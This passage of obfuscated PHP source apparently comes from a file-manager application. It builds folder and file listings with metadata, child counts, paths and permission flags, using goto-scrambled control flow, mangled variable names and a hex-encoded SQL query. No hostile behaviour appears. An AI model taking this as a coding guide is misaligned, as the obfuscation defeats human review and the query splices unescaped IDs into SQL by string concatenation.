$dƒÖß¤Æ‚Ğ[405]); $dÒÒäòç½ù = array($dƒÖß¤Æ‚Ğ[28] => $dƒÖß¤Æ‚Ğ[28], $dƒÖß¤Æ‚Ğ[77] => $dƒÖß¤Æ‚Ğ[77], $dƒÖß¤Æ‚Ğ[160] => $dƒÖß¤Æ‚Ğ[372], $dƒÖß¤Æ‚Ğ[378] => $dƒÖß¤Æ‚Ğ[378], $dƒÖß¤Æ‚Ğ[406] => $dƒÖß¤Æ‚Ğ[379], $dƒÖß¤Æ‚Ğ[187] => $dƒÖß¤Æ‚Ğ[187], $dƒÖß¤Æ‚Ğ[107] => $dƒÖß¤Æ‚Ğ[107]); $CÏ‹ŠÑƒÄ¿ = Input::get($dƒÖß¤Æ‚Ğ[407], $dƒÖß¤Æ‚Ğ[7], $F§Åà¬ÁÎœ, array_keys($dÒÒäòç½ù)); goto F‘Œ‰ç±‘Ö; E„ŞŞ¥‹í: $dƒÖß¤Æ‚Ğ =& $_SERVER[îÖ]; $F§Åà¬ÁÎœ = Model($dƒÖß¤Æ‚Ğ[399])->get($dƒÖß¤Æ‚Ğ[400]); $f®¼ïê‰¢Ÿ = Model($dƒÖß¤Æ‚Ğ[399])->get($dƒÖß¤Æ‚Ğ[401]); goto eµÑóõ¥†Û; F‘Œ‰ç±‘Ö: $f—Ä ¾¥œ¬ = Input::get($dƒÖß¤Æ‚Ğ[408], $dƒÖß¤Æ‚Ğ[7], $f®¼ïê‰¢Ÿ, array_keys($aæ³ÎáÊ¿½)); if (!in_array($CÏ‹ŠÑƒÄ¿, array_keys($dÒÒäòç½ù))) { $CÏ‹ŠÑƒÄ¿ = $dƒÖß¤Æ‚Ğ[28]; } if (!in_array($f—Ä ¾¥œ¬, array_keys($aæ³ÎáÊ¿½))) { $CÏ‹ŠÑƒÄ¿ = $dƒÖß¤Æ‚Ğ[402]; } goto cª¦î×¦¾; FÏÉŞ°£·Â: } protected function _listDataApplyItem($B‹Œì…Ÿ«µ, $FŠ¢É„Š© = false) { $f½æÖäîùí = array($B‹Œì…Ÿ«µ); $this->_listDataApply($f½æÖäîùí, $FŠ¢É„Š©); return $f½æÖäîùí[0]; } protected function _listDataApply(&$D©Æ˜×¨âè, $F¡‰¢ô¼Ï” = false) { goto F‘Šôİ§„ï; cÊºßÃØ¿æ: $this->_listAppendUser($D©Æ˜×¨âè); $this->_listFilterInfo($D©Æ˜×¨âè, $F¡‰¢ô¼Ï”); goto e©¾ö¿™–¯; F‘Šôİ§„ï: $fæ¨ÙËÈ =& $_SERVER[îÖ]; if (!$D©Æ˜×¨âè) { $D©Æ˜×¨âè = array(); return; } $DÕğ˜¦ó¬ = array_to_keyvalue($D©Æ˜×¨âè, $fæ¨ÙËÈ[33], $fæ¨ÙËÈ[369]); goto f„¯ˆ¡£; f„¯ˆ¡£: $DÕğ˜¦ó¬ = array_unique($DÕğ˜¦ó¬); $this->_listSourceCache($D©Æ˜×¨âè); if (!$F¡‰¢ô¼Ï”) { $this->_listAppendMeta($D©Æ˜×¨âè, $DÕğ˜¦ó¬); $this->_listAppendFileMeta($D©Æ˜×¨âè, $DÕğ˜¦ó¬); $this->_listAppendChildren($D©Æ˜×¨âè, $DÕğ˜¦ó¬); } goto FåÊïÏ‡ë¡; FåÊïÏ‡ë¡: $this->_listAppendPath($D©Æ˜×¨âè); $this->_listAppendAuth($D©Æ˜×¨âè); $this->_listAppendSourceInfo($D©Æ˜×¨âè, $DÕğ˜¦ó¬); goto cÊºßÃØ¿æ; e©¾ö¿™–¯: } protected function _listSourceCache($F†³Ç±Ñ½) { $EÜ–Ğ•ÅÂ =& $_SERVER[îÖ]; foreach ($F†³Ç±Ñ½ as $b×ö—ƒÌ«°) { self::$cacheSourceInfo[$EÜ–Ğ•ÅÂ[410] . $b×ö—ƒÌ«°[$EÜ–Ğ•ÅÂ[369]]] = $b×ö—ƒÌ«°; } } protected function _listFilterInfo(&$Fè½İè½Ò, $a…¸¢ËÓÌ‘ = false) { $eâ¹ „Óö˜ =& $_SERVER[îÖ]; foreach ($Fè½İè½Ò as &$FÂœùßˆ„Å) { $FÂœùßˆ„Å = $this->pathInfoFilter($FÂœùßˆ„Å); self::$cachePathInfo[$eâ¹ „Óö˜[411] . intval($a…¸¢ËÓÌ‘) . $eâ¹ „Óö˜[412] . $FÂœùßˆ„Å[$eâ¹ „Óö˜[369]]] = $FÂœùßˆ„Å; } } protected function _listMake(&$bìèì¾í§) { $EØº™®†Í =& $_SERVER[îÖ]; $bìèì¾í§[$EØº™®†Í[74]] = array(); $bìèì¾í§[$EØº™®†Í[73]] = array(); foreach ($bìèì¾í§[$EØº™®†Í[354]] as $BÛï‚¯ßá×) { $aÛç‹îæäÙ = $BÛï‚¯ßá×[$EØº™®†Í[370]] == 1 ? $EØº™®†Í[74] : $EØº™®†Í[73]; $bìèì¾í§[$aÛç‹îæäÙ][] = $BÛï‚¯ßá×; } unset($bìèì¾í§[$EØº™®†Í[354]]); } protected function _listAppendMeta(&$f£ÔÅÂØè, $Eø‚”’©ÄŒ) { goto C¾›Ì¯ô‰ö; b‹¸¢Ûï“ç: foreach ($f¯¨ƒÛ‘ê as $eˆÇ–„Û›) { if (!isset($c‰¯Ø¥‡Õø[$eˆÇ–„Û›[$f»´å©âµº[369]]])) { $c‰¯Ø¥‡Õø[$eˆÇ–„Û›[$f»´å©âµº[369]]] = array(); } if (in_array($eˆÇ–„Û›[$f»´å©âµº[89]], $cÂ¢â•¡”¢)) { continue; } $c‰¯Ø¥‡Õø[$eˆÇ–„Û›[$f»´å©âµº[369]]][$eˆÇ–„Û›[$f»´å©âµº[89]]] = $eˆÇ–„Û›[$f»´å©âµº[359]]; } foreach ($f£ÔÅÂØè as &$B‘†çÖÄ) { $B‘†çÖÄ[$f»´å©âµº[417]] = !1; if (isset($c‰¯Ø¥‡Õø[$B‘†çÖÄ[$f»´å©âµº[369]]])) { $B‘†çÖÄ[$f»´å©âµº[417]] = $c‰¯Ø¥‡Õø[$B‘†çÖÄ[$f»´å©âµº[369]]]; } if ($this->fileIsLock($B‘†çÖÄ) && $B‘†çÖÄ[$f»´å©âµº[376]]) { $cÁ«ÊÃ½ï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $B‘†çÖÄ[$f»´å©âµº[376]][$f»´å©âµº[377]] = AuthModel::authDisable($B‘†çÖÄ[$f»´å©âµº[376]][$f»´å©âµº[377]], $cÁ«ÊÃ½ï); $B‘†çÖÄ[$f»´å©âµº[376]][$f»´å©âµº[418]][$f»´å©âµº[376]] = $B‘†çÖÄ[$f»´å©âµº[376]][$f»´å©âµº[377]]; } } goto B¾‰¥êØ†; C¾›Ì¯ô‰ö: $f»´å©âµº =& $_SERVER[îÖ]; $A³Õ‚Æ—ÏÇ = array($f»´å©âµº[383] => array($f»´å©âµº[384], $Eø‚”’©ÄŒ)); $f¯¨ƒÛ‘ê = Model($f»´å©âµº[413])->field($f»´å©âµº[414])->where($A³Õ‚Æ—ÏÇ)->select(); goto B÷§ì‹íÊ; B÷§ì‹íÊ: if (!$f¯¨ƒÛ‘ê) { return; } $cÂ¢â•¡”¢ = array($f»´å©âµº[415], $f»´å©âµº[416]); $c‰¯Ø¥‡Õø = array(); goto b‹¸¢Ûï“ç; B¾‰¥êØ†: } protected function _listAppendFileMeta(&$b÷Å·´•ƒŒ, $B˜½­Ÿµ›©) { goto a¨¿îù ²É; a¯©†Ğ£Ü: $C¡‚÷ëÚ´ê = Model($FöÓÎÂÇ ğ[422])->field($f©¤˜Œ¯ÈÎ)->where($CåãåãöİÔ)->select(); $C¡‚÷ëÚ´ê = array_to_keyvalue($C¡‚÷ëÚ´ê, $FöÓÎÂÇ ğ[419]); $c¸¢œ®ë = Model($FöÓÎÂÇ ğ[423])->field($FöÓÎÂÇ ğ[424])->where($CåãåãöİÔ)->select(); goto BÑƒ²â©Íİ; a¨¿îù ²É: $FöÓÎÂÇ ğ =& $_SERVER[îÖ]; $FñÌåˆæì = array_to_keyvalue($b÷Å·´•ƒŒ, $FöÓÎÂÇ ğ[33], $FöÓÎÂÇ ğ[419]); $FñÌåˆæì = array_filter(array_unique($FñÌåˆæì)); goto Fè£ÌäôÕñ; c‡àÛµ¢ØÔ: foreach ($b÷Å·´•ƒŒ as &$c¡•˜•¾ó) { goto fÁ¾Œíßí¬; F¤®…·Œİ‰: if (isset($c¡•˜•¾ó[$FöÓÎÂÇ ğ[162]][$FöÓÎÂÇ ğ[426]])) { $c¡•˜•¾ó[$FöÓÎÂÇ ğ[426]] = json_decode($c¡•˜•¾ó[$FöÓÎÂÇ ğ[162]][$FöÓÎÂÇ ğ[426]], !0); unset($c¡•˜•¾ó[$FöÓÎÂÇ ğ[162]][$FöÓÎÂÇ ğ[426]]); } goto aå£¯ñƒ‰¯; c”‹ŠÀó: $dÓŸ’åï¿½[$FöÓÎÂÇ ğ[77]] = $c¡•˜•¾ó[$FöÓÎÂÇ ğ[77]]; $dÓŸ’åï¿½[$FöÓÎÂÇ ğ[28]] = $c¡•˜•¾ó[$FöÓÎÂÇ ğ[28]]; self::$cacheFileInfo[$FöÓÎÂÇ ğ[425] . $Aí¯‹¡öÉ] = $dÓŸ’åï¿½; goto BÛ¬×÷ˆŠÑ; BÛ¬×÷ˆŠÑ: unset($C¡‚÷ëÚ´ê[$Aí¯‹¡öÉ][$FöÓÎÂÇ ğ[75]]); $B“´ˆ“Ş¶© = is_array($fìãµ±’Í£[$Aí¯‹¡öÉ]) ? $fìãµ±’Í£[$Aí¯‹¡öÉ] : array(); $c¡•˜•¾ó[$FöÓÎÂÇ ğ[162]] = array_merge($B“´ˆ“Ş¶©, $C¡‚÷ëÚ´ê[$Aí¯‹¡öÉ]); goto F¤®…·Œİ‰; fÁ¾Œíßí¬: $Aí¯‹¡öÉ = $c¡•˜•¾ó[$FöÓÎÂÇ ğ[419]]; if (!$Aí¯‹¡öÉ || !isset($C¡‚÷ëÚ´ê[$Aí¯‹¡öÉ])) { continue; } $dÓŸ’åï¿½ = $C¡‚÷ëÚ´ê[$Aí¯‹¡öÉ]; goto c”‹ŠÀó; aå£¯ñƒ‰¯: } goto C×Šº½Şê; BÑƒ²â©Íİ: $c¸¢œ®ë = $c¸¢œ®ë ? $c¸¢œ®ë : array(); $fìãµ±’Í£ = array(); foreach ($c¸¢œ®ë as $b­×Œñê©) { if (!isset($fìãµ±’Í£[$b­×Œñê©[$FöÓÎÂÇ ğ[419]]])) { $fìãµ±’Í£[$b­×Œñê©[$FöÓÎÂÇ ğ[419]]] = array(); } $fìãµ±’Í£[$b­×Œñê©[$FöÓÎÂÇ ğ[419]]][$b­×Œñê©[$FöÓÎÂÇ ğ[89]]] = $b­×Œñê©[$FöÓÎÂÇ ğ[359]]; } goto c‡àÛµ¢ØÔ; Fè£ÌäôÕñ: if (!$FñÌåˆæì) { return; } $CåãåãöİÔ = array($FöÓÎÂÇ ğ[420] => array($FöÓÎÂÇ ğ[384], $FñÌåˆæì)); $f©¤˜Œ¯ÈÎ = $FöÓÎÂÇ ğ[421]; goto a¯©†Ğ£Ü; C×Šº½Şê: } protected function _listAppendSourceInfo(&$dŸ•Ò®Ê¯í, $BÓïÒì¼†÷) { goto dÖÆğ¬À’ø; a¸õæÖ£àÌ: $c‚¥á°‘Ãà = array_to_keyvalue_group($f‚î³î™ÆÄ, $dİ›ºªó[369]); foreach ($dŸ•Ò®Ê¯í as &$CàİÈö¢Ø) { $CàİÈö¢Ø[$dİ›ºªó[391]] = array($dİ›ºªó[430] => 0, $dİ›ºªó[431] => 0, $dİ›ºªó[432] => 0); if (isset($Aáã”Œ…[$CàİÈö¢Ø[$dİ›ºªó[369]]])) { $CàİÈö¢Ø[$dİ›ºªó[391]][$dİ›ºªó[433]] = 1; $CàİÈö¢Ø[$dİ›ºªó[391]][$dİ›ºªó[434]] = $Aáã”Œ…[$CàİÈö¢Ø[$dİ›ºªó[369]]][$dİ›ºªó[28]]; } if (isset($bù˜¥‚‘‚²[$CàİÈö¢Ø[$dİ›ºªó[369]]])) { $CàİÈö¢Ø[$dİ›ºªó[391]][$dİ›ºªó[435]] = array(); foreach ($bù˜¥‚‘‚²[$CàİÈö¢Ø[$dİ›ºªó[369]]] as $Eêçõƒ„Î) { $d×…Ş¨‡äõ = $c‚êÎ„Îğî[$Eêçõƒ„Î]; $CàİÈö¢Ø[$dİ›ºªó[391]][$dİ›ºªó[435]][] = array($dİ›ºªó[436] => $d×…Ş¨‡äõ[$dİ›ºªó[367]], $dİ›ºªó[386] => $d×…Ş¨‡äõ[$dİ›ºªó[28]], $dİ›ºªó[437] => $d×…Ş¨‡äõ[$dİ›ºªó[438]]); } } if (isset($c‚¥á°‘Ãà[$CàİÈö¢Ø[$dİ›ºªó[369]]])) { $CàİÈö¢Ø[$dİ›ºªó[391]][$dİ›ºªó[439]] = array(); foreach ($c‚¥á°‘Ãà[$CàİÈö¢Ø[$dİ›ºªó[369]]] as $c±Â¢Ğ×) { $CàİÈö¢Ø[$dİ›ºªó[391]][$dİ›ºªó[439]] = array($dİ›ºªó[440] => $c±Â¢Ğ×[$dİ›ºªó[441]], $dİ›ºªó[442] => $c±Â¢Ğ×[$dİ›ºªó[443]], $dİ›ºªó[444] => $c±Â¢Ğ×[$dİ›ºªó[369]], $dİ›ºªó[445] => $c±Â¢Ğ×[$dİ›ºªó[446]], $dİ›ºªó[447] => $c±Â¢Ğ×[$dİ›ºªó[448]]); } } } return $dŸ•Ò®Ê¯í; goto a­»ŠÆ—¥É; dÖÆğ¬À’ø: $dİ›ºªó =& $_SERVER[îÖ]; if (!defined($dİ›ºªó[427])) { return; } $E•¿¡î’É = Model($dİ›ºªó[428])->listData(); goto Fñ¯À¬¿¨Î; eŠ¡Ï‡È: $c‚êÎ„Îğî = array_to_keyvalue($E•¿¡î’É, $dİ›ºªó[367]); $bù˜¥‚‘‚² = array_to_keyvalue_group($CíÈ‹ì¼Èù, $dİ›ºªó[75], $dİ›ºªó[393]); $Aáã”Œ… = array_to_keyvalue($b¤”ğ¦™¼, $dİ›ºªó[75]); goto a¸õæÖ£àÌ; Fñ¯À¬¿¨Î: $CíÈ‹ì¼Èù = Model($dİ›ºªó[392])->listData(); $b¤”ğ¦™¼ = Model($dİ›ºªó[381])->listData(); $f‚î³î™ÆÄ = Model($dİ›ºªó[429])->listSimple(); goto eŠ¡Ï‡È; a­»ŠÆ—¥É: } protected function _listAppendChildren(&$e†¼Ê™Á–œ, $A©¤–©ß¡Í) { goto BŸ£ÏË«öË; BŸ£ÏË«öË: $Fø´İ±¹Ş× =& $_SERVER[îÖ]; $B¹´½ŞÓ† = $Fø´İ±¹Ş×[361]; $C¹¹ ©ªæ = array(); goto DâñŒâŞÔã; aå‡­Â×Ó: $aæÒ„À˜¥š = $this->tablePrefix . $this->tableName; for ($BæÛæ¨òŒ¦ = 0; $BæÛæ¨òŒ¦ < $F¥¤­·í; $BæÛæ¨òŒ¦++) { $E¸†‚‰¯âì = intval($e†¼Ê™Á–œ[$BæÛæ¨òŒ¦][$Fø´İ±¹Ş×[397]]); if ($e†¼Ê™Á–œ[$BæÛæ¨òŒ¦][$Fø´İ±¹Ş×[370]]) { $FíÇÉİñÈá = $e†¼Ê™Á–œ[$BæÛæ¨òŒ¦][$Fø´İ±¹Ş×[369]]; $B¹´½ŞÓ† .= "\123\x45\x4c\x45\103\124\x20\x2a\x20\x46\x52\117\115\40\50\123\x45\x4c\105\x43\x54\x20\x27{$FíÇÉİñÈá}\x5f\150\141\163\106\151\154\x65\x27\x20\x61\x73\40\150\x61\x73\x2c\x63\x6f\165\x6e\x74\50\x31\51\40\x61\163\x20\150\141\x73\103\157\x75\x6e\164\x20\x46\122\117\115\x20\140{$aæÒ„À˜¥š}\140\40\12\11\x9\x9\x9\11\x77\x68\145\x72\145\x20\x70\x61\162\145\x6e\x74\x49\x44\x3d{$FíÇÉİñÈá}\40\x61\156\144\x20\151\x73\x46\157\x6c\x64\x65\162\75\x30\40\x61\156\x64\x20\151\163\104\x65\154\x65\164\145\x3d{$E¸†‚‰¯âì}\x29\x20\x61\x73\40\164\x62\61\x5f{$FíÇÉİñÈá}\40\165\156\151\157\156\40\141\x6c\x6c\40\12\x9\x9\x9\11\x9\123\105\x4c\105\x43\124\x20\52\x20\106\x52\x4f\x4d\x20\x28\x53\x45\114\x45\x43\124\x20\x27{$FíÇÉİñÈá}\137\x68\x61\x73\x46\157\154\x64\145\162\x27\x20\x61\163\40\x68\x61\163\106\x69\154\x65\54\143\x6f\165\x6e\164\50\61\51\x20\141\163\x20\150\x61\x73\103\157\165\x6e\164\x20\x46\122\117\x4d\40\x60{$aæÒ„À˜¥š}\140\x20\xa\11\11\11\11\x9\x77\150\x65\162\x65\x20\160\x61\x72\x65\x6e\164\x49\x44\x3d{$FíÇÉİñÈá}\x20\141\x6e\x64\40\x69\x73\106\157\x6c\144\x65\162\x3d\61\40\141\x6e\144\40\151\x73\104\x65\x6c\x65\164\x65\75{$E¸†‚‰¯âì}\51\x20\141\163\x20\164\x62\x32\137{$FíÇÉİñÈá}\x20\x75\x6e\151\x6f\156\40\141\154\154\x20"; } if ((strlen($B¹´½ŞÓ†) >= $F–ï×ˆ‘ó® || $BæÛæ¨òŒ¦ == $F¥¤­·í - 1) && $B¹´½ŞÓ†) { $B¹´½ŞÓ† = substr($B¹´½ŞÓ†, 0, -strlen($Fø´İ±¹Ş×[449])); $F‘‘ÆÏàŞã = $this->query($B¹´½ŞÓ†); $C¹¹ ©ªæ = array_merge($C¹¹ ©ªæ, $F‘‘ÆÏàŞã); $B¹´½ŞÓ† = $Fø´İ±¹Ş×[33]; } } $C¹¹ ©ªæ = array_to_keyvalue($C¹¹ ©ªæ, $Fø´İ±¹Ş×[450]); goto bÂˆÚ»åÇ¾; bÂˆÚ»åÇ¾: foreach ($e†¼Ê™Á–œ as &$eæ¹Š‘ßš) { if ($eæ¹Š‘ßš[$Fø´İ±¹Ş×[370]]) { unset($eæ¹Š‘ßš[$Fø´İ±¹Ş×[372]]); $eæ¹Š‘ßš[$Fø´İ±¹Ş×[192]] = intval($C¹¹ ©ªæ[$eæ¹Š‘ßš[$Fø´İ±¹Ş×[369]] . $Fø´İ±¹Ş×[451]][$Fø´İ±¹Ş×[452]]); $eæ¹Š‘ßš[$Fø´İ±¹Ş×[191]] = intval($C¹¹ ©ªæ[$eæ¹Š‘ßš[$Fø´İ±¹Ş×[369]] . $Fø´İ±¹Ş×[453]][$Fø´İ±¹Ş×[452]]); } } goto fì×¥ÜÁ†³; DâñŒâŞÔã: $F–ï×ˆ‘ó® = 1024 * 50; $e†¼Ê™Á–œ = is_array($e†¼Ê™Á–œ) ? $e†¼Ê™Á–œ : array(); $F¥¤­·í = count($e†¼Ê™Á–œ); goto aå‡­Â×Ó; fì×¥ÜÁ†³: } protected function _listAppendAuth(&$BÌ‘‚³İ¯ö) { goto cš§—Ü¶‘¡; E‚§¡¥Ç×Û: $d“öïäÓÕÈ = Model($A‰•Ø¿‚Á[454])->getSourceList($AßÙÄôØßÖ, $FŸÏ®¢™¨ª); foreach ($BÌ‘‚³İ¯ö as $BÊãïˆ¥—Š => &$Dç‹§¤¯õ™) { $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]] = $d“öïäÓÕÈ[$Dç‹§¤¯õ™[$A‰•Ø¿‚Á[369]]]; if (!$Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]] && $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[371]] == self::TYPE_GROUP) { $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]] = Action($A‰•Ø¿‚Á[455])->pathGroupAuthMake($Dç‹§¤¯õ™[$A‰•Ø¿‚Á[456]]); if (!$Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]] && !_get($GLOBALS, $A‰•Ø¿‚Á[457])) { $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[189]] = !1; $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[188]] = !1; } } if ($Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]]) { $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[189]] = AuthModel::authCheckEdit($Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]][$A‰•Ø¿‚Á[377]]); $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[188]] = AuthModel::authCheckView($Dç‹§¤¯õ™[$A‰•Ø¿‚Á[376]][$A‰•Ø¿‚Á[377]]); } $this->groupPathDisplay($Dç‹§¤¯õ™); } goto EÏ‰è¹Ïë; cš§—Ü¶‘¡: $A‰•Ø¿‚Á =& $_SERVER[îÖ]; if (!defined($A‰•Ø¿‚Á[427])) { return; } $AßÙÄôØßÖ = array(); goto B´š«»æ¥…; B´š«»æ¥…: foreach ($BÌ‘‚³İ¯ö as $Dç‹§¤¯õ™) { if ($Dç‹§¤¯õ™[$A‰•Ø¿‚Á[371]] == self::TYPE_GROUP) { $AßÙÄôØßÖ[] = $Dç‹§¤¯õ™[$A‰•Ø¿‚Á[369]]; } } if (!$AßÙÄôØßÖ) { return; } $FŸÏ®¢™¨ª = array_to_keyvalue($BÌ‘‚³İ¯ö, $A‰•Ø¿‚Á[369]); goto E‚§¡¥Ç×Û; EÏ‰è¹Ïë: } public function groupPathDisplay(&$b°”Û¨Úºë) { goto bâòÀ¤‹ï; bâòÀ¤‹ï: $FØÇÖ¿„½É =& $_SERVER[îÖ]; if ($b°”Û¨Úºë[$FØÇÖ¿„½É[371]] != self::TYPE_GROUP) { return; } $E×Ğùâ¸İ¥ = Model($FØÇÖ¿„½É[458])->getInfo($b°”Û¨Úºë[$FØÇÖ¿„½É[456]]); goto fê¯ÅÖŞ¼; fê¯ÅÖŞ¼: $bù‰¾Òí±ê = $this->parentLevelArray($E×Ğùâ¸İ¥[$FØÇÖ¿„½É[459]]); $aÖØ±­­ ¦ = $FØÇÖ¿„½É[33]; foreach ($bù‰¾Òí±ê as $aïÂğ¡Ú) { $CäŸ‹ ¡¼Ó = Model($FØÇÖ¿„½É[458])->getInfo($aïÂğ¡Ú); $aÖØ±­­ ¦ .= $CäŸ‹ ¡¼Ó[$FØÇÖ¿„½É[391]][$FØÇÖ¿„½É[369]] . $FØÇÖ¿„½É[47]; } goto cñÓ—éÆ; a²æ‡Û–é³: $b°”Û¨Úºë[$FØÇÖ¿„½É[464]] = $aÖØ±­­ ¦ . $E×Ğùâ¸İ¥[$FØÇÖ¿„½É[391]][$FØÇÖ¿„½É[369]]; goto F„ÃÊÎ¶È˜; cñÓ—éÆ: $b°”Û¨Úºë[$FØÇÖ¿„½É[460]] = $E×Ğùâ¸İ¥[$FØÇÖ¿„½É[461]]; $b°”Û¨Úºë[$FØÇÖ¿„½É[380]] = $E×Ğùâ¸İ¥[$FØÇÖ¿„½É[459]]; $b°”Û¨Úºë[$FØÇÖ¿„½É[462]] = $E×Ğùâ¸İ¥[$FØÇÖ¿„½É[463]]; goto a²æ‡Û–é³; F„ÃÊÎ¶È˜: } protected function _listAppendPath(&$E÷À³šÍÆ¶) { goto fŠ·•ì®ùù; E—‰·Ê–—„: $A’ÂÁŠ¸  = array(); foreach ($fÜ¥¢‘©œ as $fñŒ…õ‡Ó‚ => $e‰ŞÏ§ˆ©) { if (!$e‰ŞÏ§ˆ©) { $A’ÂÁŠ¸ [] = $fñŒ…õ‡Ó‚; } } if ($A’ÂÁŠ¸ ) { $D¨ÙÀÇÖä = array($bÛ•Èá¢º[383] => array($bÛ•Èá¢º[384], $A’ÂÁŠ¸ )); if (count($A’ÂÁŠ¸ ) == 1) { $FØÈõÈÚß‡ = $this->sourceInfo($A’ÂÁŠ¸ [0]); $FØÈõÈÚß‡ = is_array($FØÈõÈÚß‡) ? array($FØÈõÈÚß‡) : !1; } else { $FØÈõÈÚß‡ = $this->field($bÛ•Èá¢º[465])->where($D¨ÙÀÇÖä)->select(); } $Aƒ³Øù´‹ = array_to_keyvalue($FØÈõÈÚß‡, $bÛ•Èá¢º[369], $bÛ•Èá¢º[28]); $fÜ¥¢‘©œ = array_merge_index($fÜ¥¢‘©œ, $Aƒ³Øù´‹); } goto a‹ªß¼ßª; a‹ªß¼ßª: $DäÄ¨œ‚„‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($E÷À³šÍÆ¶ as &$FÕ©ÊÓ›“¼) { goto E¡Ñ« »³; E¡Ñ« »³: $a§´¶®İØì = $this->parentLevelArray($FÕ©ÊÓ›“¼[$bÛ•Èá¢º[459]]); $EÊƒ—¸‡Ş = $this->_listAppendPathRoot($FÕ©ÊÓ›“¼, $a§´¶®İØì); foreach ($a§´¶®İØì as $A×ÔÆ¿Ù¿) { if (isset($fÜ¥¢‘©œ[$A×ÔÆ¿Ù¿])) { $EÊƒ—¸‡Ş .= $fÜ¥¢‘©œ[$A×ÔÆ¿Ù¿] . $bÛ•Èá¢º[8]; } } goto AïğŠåõÅ; AïğŠåõÅ: if ($a§´¶®İØì) { $EÊƒ—¸‡Ş .= $FÕ©ÊÓ›“¼[$bÛ•Èá¢º[28]]; } if ($FÕ©ÊÓ›“¼[$bÛ•Èá¢º[370]]) { $EÊƒ—¸‡Ş .= $bÛ•Èá¢º[8]; } $FÕ©ÊÓ›“¼[$bÛ•Èá¢º[466]] = str_replace($bÛ•Èá¢º[467], $bÛ•Èá¢º[8], $EÊƒ—¸‡Ş); goto açŒ¶­ÍíÌ; açŒ¶­ÍíÌ: $bæö“÷ğËâ = trim($FÕ©ÊÓ›“¼[$bÛ•Èá¢º[466]], $bÛ•Èá¢º[8]); if ($FÕ©ÊÓ›“¼[$bÛ•Èá¢º[461]] == $bÛ•Èá¢º[468] && $bæö“÷ğËâ) { $FÕ©ÊÓ›“¼[$bÛ•Èá¢º[28]] = $bæö“÷ğËâ; } $this->_listAppendPathRecycle($FÕ©ÊÓ›“¼, $a§´¶®İØì, $DäÄ¨œ‚„‚); goto fŞ»Ğ…‚Ì†; fŞ»Ğ…‚Ì†: } goto Bª«´í¡Ÿ…; fŠ·•ì®ùù: $bÛ•Èá¢º =& $_SERVER[îÖ]; $fÜ¥¢‘©œ = array(); foreach ($E÷À³šÍÆ¶ as &$FÕ©ÊÓ›“¼) { $fÜ¥¢‘©œ[$FÕ©ÊÓ›“¼[$bÛ•Èá¢º[369]]] = $FÕ©ÊÓ›“¼[$bÛ•Èá¢º[28]]; $a§´¶®İØì = $this->parentLevelArray($FÕ©ÊÓ›“¼[$bÛ•Èá¢º[459]]); array_shift($a§´¶®İØì); foreach ($a§´¶®İØì as $A×ÔÆ¿Ù¿) { if (!isset($fÜ¥¢‘©œ[$A×ÔÆ¿Ù¿])) { $fÜ¥¢‘©œ[$A×ÔÆ¿Ù¿] = 0; } } } goto E—‰·Ê–—„; Bª«´í¡Ÿ…: } private function _listAppendPathRecycle(&$fßŠâ°ò™‰, $d¯§Ó°—ƒğ, $dÁƒ»÷ª…Õ) { goto bŠ›Õ‡ÈÎÕ; dÖãÜ¦§©†: $FÙæå¸÷Óƒ = explode($B¿ÛñÈìÑ[8], trim($fßŠâ°ò™‰[$B¿ÛñÈìÑ[466]], $B¿ÛñÈìÑ[8])); $DÌÆâ‡¥¦ò = implode($B¿ÛñÈìÑ[8], array_slice($FÙæå¸÷Óƒ, 2)); $fßŠâ°ò™‰[$B¿ÛñÈìÑ[466]] = $B¿ÛñÈìÑ[8] . LNG($B¿ÛñÈìÑ[469]) . $B¿ÛñÈìÑ[8] . ltrim($DÌÆâ‡¥¦ò, $B¿ÛñÈìÑ[8]); goto a•™õİÜíÒ; bŠ›Õ‡ÈÎÕ: $B¿ÛñÈìÑ =& $_SERVER[îÖ]; if (intval($fßŠâ°ò™‰[$B¿ÛñÈìÑ[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($dÁƒ»÷ª…Õ, $d¯§Ó°—ƒğ) && $fßŠâ°ò™‰[$B¿ÛñÈìÑ[369]] != $dÁƒ»÷ª…Õ) { return; } goto dÖãÜ¦§©†; a•™õİÜíÒ: $fßŠâ°ò™‰[$B¿ÛñÈìÑ[459]] = $B¿ÛñÈìÑ[470] . implode($B¿ÛñÈìÑ[47], array_slice($d¯§Ó°—ƒğ, 1)) . $B¿ÛñÈìÑ[47]; if ($fßŠâ°ò™‰[$B¿ÛñÈìÑ[369]] == $dÁƒ»÷ª…Õ) { $fßŠâ°ò™‰[$B¿ÛñÈìÑ[459]] = $B¿ÛñÈìÑ[470]; $fßŠâ°ò™‰[$B¿ÛñÈìÑ[461]] = $B¿ÛñÈìÑ[468]; $fßŠâ°ò™‰[$B¿ÛñÈìÑ[28]] = LNG($B¿ÛñÈìÑ[469]); } $fßŠâ°ò™‰[$B¿ÛñÈìÑ[471]] = $B¿ÛñÈìÑ[472]; goto CÓŒ‘òˆ ; CÓŒ‘òˆ : } protected function _listAppendPathRoot(&$DÛ˜©ĞØ™, $CŠ†‡ÊŠ—¢) { $Aœê×ÎÊ±Ã =& $_SERVER[îÖ]; $Cë‹ÓãØš = $Aœê×ÎÊ±Ã[33]; if ($DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[371]] == self::TYPE_USER) { if (defined($Aœê×ÎÊ±Ã[427]) && $DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[456]] == USER_ID) { $Cë‹ÓãØš = LNG($Aœê×ÎÊ±Ã[473]); if (!$CŠ†‡ÊŠ—¢) { $DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[28]] = $Cë‹ÓãØš; } } else { $F„Ó¥‰íÓª = Model($Aœê×ÎÊ±Ã[474])->getInfoSimple($DÛ˜©ĞØ™[$Aœê×ÎÊ±Ã[456]]); $Cë‹ÓãØš = LNG($Aœê×ÎÊ±Ã[475]) . 